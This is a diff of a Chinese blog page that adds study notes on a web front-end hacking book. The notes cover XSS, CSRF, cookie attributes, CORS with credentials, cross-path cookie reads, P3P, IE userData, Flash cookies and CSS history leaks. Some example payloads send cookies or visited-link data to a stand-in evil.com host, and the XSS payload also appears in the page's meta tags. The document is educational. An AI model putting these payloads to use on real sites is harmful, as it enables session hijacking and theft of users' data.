@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="林瑞玉的博客">
+<meta name="description" content="XSS 跨站脚本攻击如果攻击者构造出如下链接：http://www.foo.com/info.html#new%20Image().src=&amp;quot;http://www.evil.com/steal.php?c=&amp;quot;+escape(document.cookie)浏览器解释执行后，下面的语句：eval(location.hash.substr(1));会变为：eval(‘new Ima">
 <meta property="og:type" content="article">
 <meta property="og:title" content="读《web前端黑客技术揭秘》">
 <meta property="og:url" content="http://lry1994.github.io/study/2018/6/webSafety.html">
 <meta property="og:site_name" content="圆玉的博客">
-<meta property="og:description" content="林瑞玉的博客">
+<meta property="og:description" content="XSS 跨站脚本攻击如果攻击者构造出如下链接：http://www.foo.com/info.html#new%20Image().src=&amp;quot;http://www.evil.com/steal.php?c=&amp;quot;+escape(document.cookie)浏览器解释执行后，下面的语句：eval(location.hash.substr(1));会变为：eval(‘new Ima">
 <meta property="og:locale" content="zh-hk">
-<meta property="og:updated_time" content="2018-06-22T07:40:34.256Z">
+<meta property="og:updated_time" content="2018-07-02T02:15:40.662Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="读《web前端黑客技术揭秘》">
-<meta name="twitter:description" content="林瑞玉的博客">
+<meta name="twitter:description" content="XSS 跨站脚本攻击如果攻击者构造出如下链接：http://www.foo.com/info.html#new%20Image().src=&amp;quot;http://www.evil.com/steal.php?c=&amp;quot;+escape(document.cookie)浏览器解释执行后，下面的语句：eval(location.hash.substr(1));会变为：eval(‘new Ima">
 
 
 
@@ -347,7 +347,33 @@
       
 
       
-        
+        <p>XSS 跨站脚本攻击<br>如果攻击者构造出如下链接：<br><a href="http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)" target="_blank" rel="noopener">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</a><br>浏览器解释执行后，下面的语句：<br>eval(location.hash.substr(1));<br>会变为：<br>eval(‘new Image().src=”<a href="http://www.evil.com/steal.php?c=&quot;+escape" target="_blank" rel="noopener">http://www.evil.com/steal.php?c=&quot;+escape</a>(document.<br>cookie)’)<br>Cookies 会话信息就会被盗取到黑客的网站上</p>
+<p>CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”<br>目标权限），然后去做坏事，<br>“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。</p>
+<p>APT（持久化威胁）攻击<br>如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。</p>
+<p>HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？<br>这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发<br>送出去。Cookies 还可以包括登录认证后的身份信息。</p>
+<p>Content-Type: text/html;charset=gbk<br>响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏<br>览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码<br>方式，同样可能带来安全问题。</p>
+<p>Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030<br>00:00:00 GMT; path=/; domain=.foo.com<br>每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。<br>expires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。<br>path：相对路径，只有这个路径下的资源可以访问这个Cookie。<br>domain：域名，不允许设为下一级子域或其他外域，可以指定为父级域<br>HttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户<br>端脚本读取）。<br>Secure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着<br>Secure Cookie 能被盗取，可写意味着能被篡改。</p>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行</p>
+<p>当网站页面使用iframe 方式嵌入一个页面时，<br>我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？<br>如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow<br>来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。<br>如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，<br>这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权<br>限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，</p>
+<h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p> <a href="http://www.foo.com（来源域）的AJAX" target="_blank" rel="noopener">www.foo.com（来源域）的AJAX</a> 向<a href="http://www.evil.com（目标域）发起了请求，浏览器会" target="_blank" rel="noopener">www.evil.com（目标域）发起了请求，浏览器会</a><br>给自动带上Origin 头，如下：<br>Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：<br>Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>表示同意跨域</p>
+<p>如果目标域不设置Access-Control-Allow-Origin: <a href="http://www.foo.com，那么隐私数据可" target="_blank" rel="noopener">http://www.foo.com，那么隐私数据可</a><br>以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被<br>目标域的steal.php 接收到了。</p>
+<h3 id="跨域带上会话"><a href="#跨域带上会话" class="headerlink" title="跨域带上会话"></a>跨域带上会话</h3><p>默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：<br>&lt;?php<br>header(“Access-Control-Allow-Origin: <a href="http://www.foo.com&quot;)" target="_blank" rel="noopener">http://www.foo.com&quot;)</a>;<br>header(“Access-Control-Allow-Credentials: true”); // 允许跨域证书发送<br>//…<br>?&gt;<br>有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么<br>Access-Control-Allow-Origin 就不能设置为*通配符</p>
+<h3 id="跨路径读取Cookie"><a href="#跨路径读取Cookie" class="headerlink" title="跨路径读取Cookie"></a>跨路径读取Cookie</h3><p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行<br>DOM 操作即可，/evil/路径下页面的代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xc = <span class="function"><span class="keyword">function</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>); <span class="comment">// iframe 进入同域的目标页面</span></span><br><span class="line">o.src = src;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(o);</span><br><span class="line">o.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// iframe 加载完成后</span></span><br><span class="line">d = o.contentDocument || o.contentWindow.document;</span><br><span class="line"><span class="comment">// 获取document 对象</span></span><br><span class="line">alert(d.cookie); <span class="comment">// 获取cookie</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;(<span class="string">'http://a.foo.com/admin/index.php'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p>
+<h3 id="本地Cookie-与内存Cookie"><a href="#本地Cookie-与内存Cookie" class="headerlink" title="本地Cookie 与内存Cookie"></a>本地Cookie 与内存Cookie</h3><p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了<br>过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，<br>待过期时间到了才会消失。</p>
+<h3 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h3><p>HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项<br>隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标<br>网站而设置或发送，仅IE 执行了该策略。<br>比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。<br>加载的时候，有两种场景</p>
+<ol>
+<li><p>浏览器是否会允许foo 域设置自己的Cookie</p>
+<p> 在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在<code>响应的时候带上P3P 字段</code></p>
+</li>
+<li><p>浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie</p>
+<p> 发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果<br> 是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头<br> 也没用。</p>
+<h3 id="IE的userData"><a href="#IE的userData" class="headerlink" title="IE的userData"></a>IE的userData</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">set_ud</span>(<span class="params">key,value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>); <span class="comment">// x 为任意div 的id 值</span></span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key,value);</span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.load(<span class="string">"db"</span>);</span><br><span class="line">    alert(a.getAttribute(key));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key, <span class="string">""</span>); <span class="comment">// 设置为空值即可</span></span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    set_ud(<span class="string">'a'</span>,<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>); <span class="comment">// 设置</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">    del_ud(<span class="string">'a'</span>); <span class="comment">// 删除a 的值</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="FlashCookie"><a href="#FlashCookie" class="headerlink" title="FlashCookie"></a>FlashCookie</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_lso</span><span class="params">(k:String=<span class="string">"default"</span>, v:String=<span class="string">""</span>)</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 设置值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.data[k] = v;</span><br><span class="line">    shared.flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_lso</span><span class="params">(k:String=<span class="string">"default"</span>)</span>:String</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 获取值</span></span><br><span class="line">    <span class="keyword">var</span> str:String = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    str = shared.data[k];</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear_lso</span><span class="params">()</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 清空值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="函数劫持很简单"><a href="#函数劫持很简单" class="headerlink" title="函数劫持很简单"></a>函数劫持很简单</h3><p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p>
+<h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=a2);&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -408,8 +434,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/study/2018/6/suibi.html" rel="next" title="2018-6总结">
-                <i class="fa fa-chevron-left"></i> 2018-6总结
+              <a href="/study/2018/5/suibi.html" rel="next" title="2018-5月总结">
+                <i class="fa fa-chevron-left"></i> 2018-5月总结
               </a>
             
           </div>
@@ -418,8 +444,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/study/Comprehensive/interview.html" rel="prev" title="面试题摘录">
-                面试题摘录 <i class="fa fa-chevron-right"></i>
+              <a href="/study/2018/6/suibi.html" rel="prev" title="2018-6总结">
+                2018-6总结 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -480,8 +506,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -500,7 +535,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
@@ -574,6 +609,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe"><span class="nav-number">1.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨域"><span class="nav-number">2.</span> <span class="nav-text">跨域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨域带上会话"><span class="nav-number">3.</span> <span class="nav-text">跨域带上会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨路径读取Cookie"><span class="nav-number">4.</span> <span class="nav-text">跨路径读取Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地Cookie-与内存Cookie"><span class="nav-number">5.</span> <span class="nav-text">本地Cookie 与内存Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P3P"><span class="nav-number">6.</span> <span class="nav-text">P3P</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IE的userData"><span class="nav-number">7.</span> <span class="nav-text">IE的userData</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FlashCookie"><span class="nav-number">8.</span> <span class="nav-text">FlashCookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#函数劫持很简单"><span class="nav-number">9.</span> <span class="nav-text">函数劫持很简单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#css"><span class="nav-number">10.</span> <span class="nav-text">css</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
